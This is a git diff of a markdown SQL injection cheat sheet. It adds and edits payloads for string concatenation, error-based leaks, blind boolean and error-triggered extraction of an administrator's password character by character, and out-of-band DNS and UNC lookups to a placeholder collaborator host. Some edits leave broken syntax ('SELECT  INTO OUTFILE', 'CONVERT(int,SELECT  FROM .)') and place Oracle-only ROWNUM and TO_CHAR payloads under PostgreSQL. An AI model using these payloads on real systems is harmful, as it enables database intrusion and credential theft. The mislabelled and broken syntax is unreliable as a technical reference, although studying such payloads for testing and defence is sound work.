@@ -11,7 +11,7 @@ SQLi is a common web application vulnerability that is caused by unsanitized use
 
 ## String Concatenation
 
-We can concatenate together multiple strings to make a single strings.
+We can concatenate together multiple strings to make a single strings. It also works to do a subquery
 
 * **Oracle**:
 ```
@@ -26,6 +26,7 @@ We can concatenate together multiple strings to make a single strings.
 * **PostgreSQL**:
 ```
 'foo'||'bar'
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
 ```
 
 * **MySQL**:
@@ -33,6 +34,10 @@ We can concatenate together multiple strings to make a single strings.
 'foo' 'bar'
 CONCAT('foo', 'bar')
 ```
+
+> **Note**: It's important while concatenating to only retrieve one element.
+>
+> `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
 
 ## Substring
 
@@ -149,7 +154,7 @@ SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
 
 * **PostgreSQL**:
 ```
-1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)
+1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END)
 ```
 
 * **MySQL**:
@@ -253,7 +258,7 @@ copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
 * **MySQL**: Only on Windows.
 ```
 LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
-SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+SELECT  INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 ```
 
 ## DNS Lookup with data exfiltration
@@ -458,7 +463,7 @@ Use CONVERT or CAST to force an ERROR and see the output of the query on errors 
 _Example of Microsoft SQL Server:_
 
 ```
-1', CONVERT(int,SELECT ...... FROM ....)
+1', CONVERT(int,SELECT  FROM .)
 
 a',convert(int,(SELECT CURRENT_USER)))--
 a',convert(int,(SELECT DB_NAME(0))))--
@@ -493,21 +498,21 @@ A SQLi is blind because we don't have access to the error log or any type of out
 We are going to try to distinct the application response to a `TRUE` and `FALSE` query.
 
 ```
-...xyz' AND '1'='1
-...xyz' AND '1'='2
+xyz' AND '1'='1
+xyz' AND '1'='2
 ```
 If we can get the difference of these two queries we can use substring to retrieve data.
 
 But first we need to know the lenght of the data to retrieve.
 
 ```
-...xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) > 5 -- -
-...xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 15 -- -
+xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) > 5 -- -
+xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 15 -- -
 ```
 
 ```
-..xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) >'m
-..xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) ='s
+xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) >'m
+xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) ='s
 ```
 
 The following is a python example script to automate the data retrieval of a alphanumerical 20 characters length password.
@@ -545,6 +550,26 @@ print(results)
 ```
 
 ## Conditional Responses by triggering SQL errors
+
+If injecting different boolean conditions makes no difference to the application's response we can force an error using the `1/0`.
+
+Example of a OracleDB query:
+
+```
+xyz' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END) ||'a
+xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END) ||'a
+```
+If we can get the difference of these two queries we can use substring to retrieve data.
+
+```
+xyz' || (SELECT CASE WHEN (LENGTH(password) > 5) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
+xyz' || (SELECT CASE WHEN (LENGTH(password) = 15) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
+```
+
+```
+xyz' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
+xyz' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 's') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
+```
 
 
 ## Time Based
